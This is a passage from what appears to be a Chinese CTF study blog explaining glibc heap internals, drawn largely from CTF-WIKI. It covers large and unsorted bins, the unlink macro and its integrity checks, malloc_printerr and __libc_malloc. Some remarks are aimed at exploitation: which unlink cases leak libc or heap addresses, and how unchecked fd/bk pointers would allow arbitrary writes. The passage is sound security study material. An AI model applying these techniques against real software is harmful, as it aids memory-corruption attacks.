class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32(sz)                                                  \</span></span><br><span class="line">    (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">38</span>)                                     \</span><br><span class="line">         ? <span class="number">56</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32_big(sz)                                              \</span></span><br><span class="line">    (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">45</span>)                                     \</span><br><span class="line">         ? <span class="number">49</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_64(sz)                                                  \</span></span><br><span class="line">    (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>)                                     \</span><br><span class="line">         ? <span class="number">48</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index(sz)                                                     \</span></span><br><span class="line">    (SIZE_SZ == <span class="number">8</span> ? largebin_index_64(sz) : MALLOC_ALIGNMENT == <span class="number">16</span>             \</span><br><span class="line">                                                ? largebin_index_32_big(sz)    \</span><br><span class="line">                                                : largebin_index_32(sz))</span><br></pre></td></tr></table></figure><ul><li><p><em>large chunk</em> 可以添加、删除在 <em>large bin</em> 的任何一个位置。</p></li><li><p>鉴于同一个 <em>large bin</em> 中每个 <em>chunk</em> 的大小不一定相同，因此为了加快内存分配和释放的速度，就将同一个 <em>large bin</em> 中的所有 <em>chunk</em> 按照 <em>chunk size</em> 进行从大到小的排列：最大的 <em>chunk</em> 放在链表的前端，最小的 <em>chunk</em> 放在尾端。</p></li><li><p><em>large bin</em> 的 <code>free</code> （合并）操作类似于 <em>small bin</em>。</p></li><li><p><em>large bin</em> malloc （部分）操作：</p><p>如果尾端最小的 <em>chunk</em> 大于用户请求的大小的话，就将该 <em>chunk</em> 拆分为两个 <em>chunk</em>：前者返回给用户，大小等同于用户请求的大小；剩余的部分做为一个新的 <em>chunk</em> 添加到 <em>unsorted bin</em> 中。</p></li></ul><h4 id="Unsorted-Bin"><a href="#Unsorted-Bin" class="headerlink" title="Unsorted Bin"></a>Unsorted Bin</h4><p>unsorted bin 可以视为空闲 chunk 回归其所属 bin 之前的缓冲区。</p><p>其在 glibc 中具体的说明如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Unsorted chunks</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    All remainders from chunk splits, as well as all returned chunks,</span></span><br><span class="line"><span class="comment">    are first placed in the &quot;unsorted&quot; bin. They are then placed</span></span><br><span class="line"><span class="comment">    in regular bins after malloc gives them ONE chance to be used before</span></span><br><span class="line"><span class="comment">    binning. So, basically, the unsorted_chunks list acts as a queue,</span></span><br><span class="line"><span class="comment">    with chunks being placed on it in free (and malloc_consolidate),</span></span><br><span class="line"><span class="comment">    and taken off (to be either used or placed in bins) in malloc.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span></span><br><span class="line"><span class="comment">    does not have to be taken into account in size comparisons.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>从下面的宏我们可以看出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unsorted_chunks(M) (bin_at(M, 1))</span></span><br></pre></td></tr></table></figure><p>unsorted bin 处于我们之前所说的 bin 数组下标 1 处。故而 unsorted bin 只有一个链表。unsorted bin 中的空闲 chunk 处于乱序状态，主要有两个来源</p><ul><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考上面的介绍。</li></ul><p>此外，Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO 。</p><p>下面附上各类上述三类 <em>bin</em> 的逻辑：</p><p><img src="img%5Cunsorted-small-large-bin.jpg" alt="unsorted-small-large-bin"></p><h4 id="common-macro"><a href="#common-macro" class="headerlink" title="common macro"></a>common macro</h4><p>这里介绍一些通用的宏</p><p><strong>根据 chunk 的大小统一地获得 chunk 所在的索引</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_index(sz)                                                          \</span></span><br><span class="line">    ((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz))</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><p><a href="https://murphypei.github.io/blog/2019/01/linux-heap">Linux 堆内存管理深入分析</a></p></li><li><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux">CTF-WIKI</a></p></li><li><p><a href="https://blog.csdn.net/AliMobileSecurity/article/details/51384912">Linux堆内存管理深入分析(上半部)</a></p></li><li><p><a href="https://blog.csdn.net/AliMobileSecurity/article/details/51481718">Linux堆内存管理深入分析(下半部)</a></p></li><li><p><a href="https://blog.lao-yuan.com/2018/05/29/Linux%E4%B8%8B%E5%A0%86%E6%A0%88%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html">Linux下堆栈结构分析</a></p></li></ul><h1 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h1><blockquote><p>绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录</p></blockquote><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>unlink 用来将一个双向链表（只存储空闲的 chunk）中的一个元素取出来，可能在以下地方使用</p><ul><li><p>malloc</p><ul><li><p>从恰好大小合适的 large bin 中获取 chunk。</p><ul><li><p><strong>这里需要注意的是 fastbin 与 small bin 就没有使用 unlink<a href="%E6%97%A0%E6%B3%95%E6%8F%90%E5%89%8D%E9%A2%84%E7%9F%A5%E7%9A%84%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4%EF%BC%8C%E6%9B%B4%E5%A4%9A%E6%98%AF%E6%A0%B9%E6%8D%AE%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E9%9C%80%E8%A6%81%E8%80%8C%E5%8A%A8%E6%80%81%E5%8F%98%E5%8C%96">^1</a>，这就是为什么漏洞会经常出现在它们这里的原因。</strong></p><p><a href="%E6%97%A0%E6%B3%95%E6%8F%90%E5%89%8D%E9%A2%84%E7%9F%A5%E7%9A%84%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4%EF%BC%8C%E6%9B%B4%E5%A4%9A%E6%98%AF%E6%A0%B9%E6%8D%AE%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E9%9C%80%E8%A6%81%E8%80%8C%E5%8A%A8%E6%80%81%E5%8F%98%E5%8C%96">^1</a>: smallbin malloc 没有 unlink free 时会有，详细看图对比 largebin 和 smallbin，图片太大，放图片链接：<a href="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/heap.png">head</a></p></li><li><p>依次<strong>遍历处理</strong> unsorted bin 时也没有使用 unlink 。</p></li></ul></li><li><p>从比请求的 chunk 所在的 bin 大的 bin 中取 chunk。</p></li></ul></li><li><p>free</p><ul><li>后向合并，合并物理相邻低地址空闲 chunk。</li><li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li><li><p>malloc_consolidate</p><ul><li>后向合并，合并物理相邻低地址空闲 chunk。</li><li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li><li><p>realloc</p><ul><li>前向扩展，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li></ul></li></ul><p>由于 unlink 使用非常频繁，所以 unlink 被实现为了一个宏，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="comment">// unlink p</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    <span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line">    FD = P-&gt;fd;                                                                      \</span><br><span class="line">    BK = P-&gt;bk;                                                                      \</span><br><span class="line">    <span class="comment">// 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line">    <span class="keyword">else</span> &#123;                                                                      \</span><br><span class="line">        FD-&gt;bk = BK;                                                              \</span><br><span class="line">        BK-&gt;fd = FD;                                                              \</span><br><span class="line">        <span class="comment">// 下面主要考虑 P 对应的 nextsize 双向链表的修改</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))                              \</span><br><span class="line">            <span class="comment">// 如果P-&gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。</span></span><br><span class="line">            <span class="comment">// 那么其实也就没有必要对 nextsize 字段进行修改了。</span></span><br><span class="line">            <span class="comment">// 这里没有去判断 bk_nextsize 字段，可能会出问题。</span></span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                      \</span><br><span class="line">            <span class="comment">// 类似于小的 chunk 的检查思路</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);                                              \</span><br><span class="line">            <span class="comment">// 这里说明 P 已经在 nextsize 链表中了。</span></span><br><span class="line">            <span class="comment">// 如果 FD 没有在 nextsize 链表中</span></span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                                      \</span><br><span class="line">                <span class="comment">// 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P</span></span><br><span class="line">                <span class="comment">// 令 FD 为 nextsize 串起来的</span></span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                      \</span><br><span class="line">                <span class="keyword">else</span> &#123;                                                              \</span><br><span class="line">                <span class="comment">// 否则我们需要将 FD 插入到 nextsize 形成的双链表中</span></span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                              \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                              \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                              \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                              \</span><br><span class="line">                  &#125;                                                              \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                                              \</span><br><span class="line">                <span class="comment">// 如果在的话，直接拿走即可</span></span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                      \</span><br><span class="line">              &#125;                                                                      \</span><br><span class="line">          &#125;                                                                      \</span><br><span class="line">      &#125;                                                                              \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们以 small bin 的 unlink 为例子介绍一下。对于 large bin 的 unlink，与其类似，只是多了一个 nextsize 的处理。</p><p><img src="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/figure/unlink_smallbin_intro.png" alt="img"></p><p>可以看出， <strong>P 最后的 fd 和 bk 指针并没有发生变化</strong>，但是当我们去遍历整个双向链表时，已经遍历不到对应的链表了。这一点没有变化还是很有用处的，因为我们有时候可以使用这个方法来泄漏地址</p><ul><li>libc 地址<ul><li>P 位于双向链表头部，bk 泄漏</li><li>P 位于双向链表尾部，fd 泄漏</li><li>双向链表只包含一个空闲 chunk 时，P 位于双向链表中，fd 和 bk 均可以泄漏</li></ul></li><li>泄漏堆地址，双向链表包含多个空闲 chunk<ul><li>P 位于双向链表头部，fd 泄漏</li><li>P 位于双向链表中，fd 和 bk 均可以泄漏</li><li>P 位于双向链表尾部，bk 泄漏</li></ul></li></ul><p><strong>注意</strong></p><ul><li>这里的头部指的是 bin 的 fd 指向的 chunk，即双向链表中最新加入的 chunk。</li><li>这里的尾部指的是 bin 的 bk 指向的 chunk，即双向链表中最先加入的 chunk。</li></ul><p>同时，无论是对于 fd，bk 还是 fd_nextsize ，bk_nextsize，程序都会检测 fd 和 bk 是否满足对应的要求。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// next_size related</span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><p>看起来似乎很正常。我们以 fd 和 bk 为例，P 的 forward chunk 的 bk 很自然是 P ，同样 P 的 backward chunk 的 fd 也很自然是 P 。如果没有做相应的检查的话，我们可以修改 P 的 fd 与 bk，从而可以很容易地达到任意地址写的效果。关于更加详细的例子，可以参见利用部分的 unlink 。</p><p><strong>注意：堆的第一个 chunk 所记录的 prev_inuse 位默认为 1。</strong></p><h2 id="malloc-printerr"><a href="#malloc-printerr" class="headerlink" title="malloc_printerr"></a>malloc_printerr</h2><p>在 glibc malloc 时检测到错误的时候，会调用 <code>malloc_printerr</code> 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_printerr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">  __libc_message(do_abort, <span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">  __builtin_unreachable();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要会调用 <code>__libc_message</code> 来执行<code>abort</code> 函数，如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((action &amp; do_abort)) &#123;</span><br><span class="line">  <span class="keyword">if</span> ((action &amp; do_backtrace))</span><br><span class="line">    BEFORE_ABORT(do_abort, written, fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Kill the application.  */</span></span><br><span class="line">  <span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>abort</code> 函数里，在 glibc 还是 2.23 版本时，会 fflush stream。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Flush all streams.  We cannot close them now because the user</span></span><br><span class="line"><span class="comment">   might have registered a handler for SIGABRT.  */</span></span><br><span class="line"><span class="keyword">if</span> (stage == <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    ++stage;</span><br><span class="line">    fflush (<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="申请内存块"><a href="#申请内存块" class="headerlink" title="申请内存块"></a>申请内存块</h1><blockquote><p>Allocate Heap Memory</p><p>绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录</p></blockquote><h2 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><p>一般我们会使用 malloc 函数来申请内存块，可是当仔细看 glibc 的源码实现时，其实并没有 malloc 函数。其实该函数真正调用的是 __libc_malloc 函数。为什么不直接写个 malloc 函数呢，因为有时候我们可能需要不同的名称。此外，__libc_malloc 函数只是用来简单封装 _int_malloc 函数。_int_malloc 才是申请内存块的核心。下面我们来仔细分析一下具体的实现。</p><p>该函数会<strong>首先检查是否有内存分配函数的钩子函数（__malloc_hook）</strong>，这个主要用于用户自定义的堆分配函数，方便用户快速修改堆分配函数并进行测试。这里需要注意的是，<strong>用户申请的字节一旦进入申请内存函数中就变成了无符号整数</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wapper for int_malloc</span></span><br><span class="line"><span class="keyword">void</span> *__libc_malloc(<span class="keyword">size_t</span> bytes) &#123;<span class="comment">//size_t 为当前程序位数最长的无符号int型</span></span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="keyword">void</span> * victim;</span><br><span class="line">    <span class="comment">// 检查是否有内存分配钩子，如果有，调用钩子并返回.</span></span><br><span class="line">    <span class="keyword">void</span> *(*hook)(<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *) = atomic_forced_read(__malloc_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))<span class="comment">//钩子不为空</span></span><br><span class="line">        <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS(<span class="number">0</span>));<span class="comment">//调用钩子并返回</span></span><br></pre></td></tr></table></figure><p>接着会寻找一个 arena 来试图分配内存。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arena_get(ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>然后调用 _int_malloc 函数去申请对应的内存。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim &#x3D; _int_malloc(ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>如果分配失败的话，ptmalloc 会尝试再去寻找一个可用的 arena，并分配内存。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Retry with another arena only if we were able to find a usable arena</span><br><span class="line">   before.  *&#x2F;</span><br><span class="line">if (!victim &amp;&amp; ar_ptr !&#x3D; NULL) &#123;</span><br><span class="line">    LIBC_PROBE(memory_malloc_retry, 1, bytes);</span><br><span class="line">    ar_ptr &#x3D; arena_get_retry(ar_ptr, bytes);</span><br><span class="line">    victim &#x3D; _int_malloc(ar_ptr, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果申请到了 arena，那么在退出之前还得解锁。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (ar_ptr !&#x3D; NULL) __libc_lock_unlock(ar_ptr-&gt;mutex);</span><br></pre></td></tr></table></figure><p>判断目前的状态是否满足以下条件</p><ul><li>要么没有申请到内存</li><li>要么是 mmap 的内存</li><li><strong>要么申请到的内存必须在其所分配的 arena 中</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert(!victim || chunk_is_mmapped(mem2chunk(victim)) ||</span><br><span class="line">       ar_ptr &#x3D;&#x3D; arena_for_chunk(mem2chunk(victim)));</span><br></pre></td></tr></table></figure><p>最后返回内存。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    return victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><p>_int_malloc 是内存分配的核心函数，其核心思路有如下</p><ol><li>它根据用户申请的<strong>内存块大小</strong>以及<strong>相应大小 chunk 通常使用的频度</strong>（fastbin chunk, small chunk, large chunk），依次实现了不同的分配方法。</li><li>它由小到大依次检查不同的 bin 中是否有相应的空闲块可以满足用户请求的内存。</li><li>当所有的空闲 chunk 都无法满足时，它会考虑 top chunk。</li><li>当 top chunk 也无法满足时，堆分配器才会进行内存块申请。</li></ol><p>在进入该函数后，函数立马定义了一系列自己需要的变量，并将用户申请的内存大小转换为内部的 chunk 大小。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 